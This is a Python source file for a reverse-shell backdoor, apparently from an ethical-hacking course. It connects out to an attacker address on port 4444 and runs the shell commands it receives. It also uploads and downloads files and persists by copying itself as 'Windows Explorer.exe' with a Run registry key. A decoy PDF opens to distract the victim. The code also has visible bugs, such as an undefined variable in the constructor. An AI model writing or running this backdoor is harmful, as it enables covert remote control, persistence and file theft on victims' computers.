#!/usr/bin/env python
# -*- encoding: utf-8 -*-

##############################################################################
#                                                                            #
#                                 PY & EH                                    #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)
# works on all os's
#  (client/target machine)
import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.result = result

    def persistence(self):
        backdoor_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(backdoor_file_location):
            shutil.copyfile(sys.executable, backdoor_file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v name_of_entry-eg:backdoor /t REG_SZ /d "' + backdoor_file_location + '"',
                shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_sys_cmd(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

        # while True:
        #     self.connection.send("\n[+] Connection established.\n")
        #     try:
        #     except subprocess.CalledProcessError:
        #         return "[+] Error during command execution"

    def change_working_dir(self, path):
        os.chdir(path)
        return "[+] Changing working directory to > " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] File-upload successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b16encode(file.read())

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    result = self.change_working_dir(command[1])
                elif command[0] == "download":
                    result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    result = self.write_file(command[1], command[2])
                else:
                    result = self.execute_sys_cmd(command).decode()
            except Exception as e:
                result = "[-] Error during command execution"

            self.reliable_send(result)


file_name = sys._MEIPASS + "\sample_file.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("10.10.x.y", 4444)
    Backdoor.run(self=my_backdoor)
except Exception:
    sys.exit()
